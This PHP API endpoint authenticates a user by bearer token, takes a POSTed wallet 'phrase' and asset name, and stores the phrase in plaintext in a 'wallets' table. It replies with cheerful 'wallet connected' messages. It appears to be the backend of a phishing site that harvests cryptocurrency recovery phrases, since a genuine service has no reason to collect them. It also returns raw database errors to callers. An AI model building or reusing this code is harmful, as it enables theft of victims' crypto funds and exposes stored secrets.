<?php
require_once './classes/Auth.php';
// Authurization
$token = Auth::getBearerToken();
$payload = Auth::validateToken($token);
$method = $_SERVER['REQUEST_METHOD'];
// Check if the token is valid
if (!$payload) {
  ApiResponse('error', 401, 'Unauthorized');
}

$user = new User();
$DB = new DB();
$conn = $DB->connect();

// Get the user ID from the token payload
$userId = $payload['uid'];
$currentUser = $user->findById($userId);

// POST
if ( $method === 'POST' ) {
	if ( !isset($_POST['phrase']) || !isset($_POST['asset']) ) {
		return ApiResponse('error', 400, 'All fields are required');
	}
	
	$phrase = $_POST['phrase'];
	$asset = $_POST['asset'];

	// Check if phrase already exists
	$checkPhrase = $conn->prepare("SELECT * FROM wallets WHERE phrase = ? AND user_id = ?");
	$checkPhrase->execute([$phrase, $userId]);
	if ( $checkPhrase->rowCount() > 0) {
		return ApiResponse('error', 400, '❌ This wallet is already linked to your account.');
	}

	$sql = "INSERT INTO wallets (user_id, asset, phrase) VALUES (?, ?, ?)";
	$stmt = $conn->prepare($sql);
	try {
		$stmt->execute([$userId, $asset, $phrase]);
		return ApiResponse('success', 200, '✅ Wallet connected successfully.');
	} catch (PDOException $th) {
		return ApiResponse('error', 500, $th->getMessage());
	}

}
